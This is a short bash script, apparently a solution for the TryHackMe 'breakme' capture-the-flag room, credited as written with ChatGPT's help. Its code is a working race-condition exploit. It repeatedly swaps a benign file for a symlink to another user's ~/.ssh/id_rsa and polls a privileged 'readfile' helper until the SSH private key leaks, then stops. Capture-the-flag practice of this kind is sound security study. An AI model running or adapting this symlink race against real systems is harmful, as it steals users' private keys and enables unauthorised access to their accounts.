#!/bin/bash

# script with assistance of ChatGPT for tryhackme room breakme https://tryhackme.com/r/room/breakmenu
# Function to stop the loop if the key is found
stop_if_key_found() {
    while true; do
        output=$(/home/youcef/readfile /home/john/breakmedumyfile)  # Read the file
        echo "$output"  # Print the output to monitor it
        if [[ "$output" == *"-----BEGIN OPENSSH PRIVATE KEY-----"* ]]; then
            echo "Private key found! Stopping the loop..."
            kill $symlink_loop_pid  # Kill the symlink creation loop
            exit 0  # Exit the script
        fi
        sleep 0.01  # Short delay before next iteration
    done
}

# Loop to continuously create and remove the symlink in order to exploit the race condition
(
    while true; do
        ln -sf /home/youcef/.ssh/id_rsa /home/john/breakmedumyfile  # Create the symlink to the RSA key
        sleep 0.01  # Short delay to increase chances of hitting the race condition
        rm /home/john/breakmedumyfile  # Unlink the symlink
        touch /home/john/breakmedumyfile  # Replace with a benign file to pass the checks
        sleep 0.01  # Short delay before next iteration
    done
) &
symlink_loop_pid=$!  # Get the PID of the background symlink creation loop

# Call the function that stops the script when the key is found
stop_if_key_found
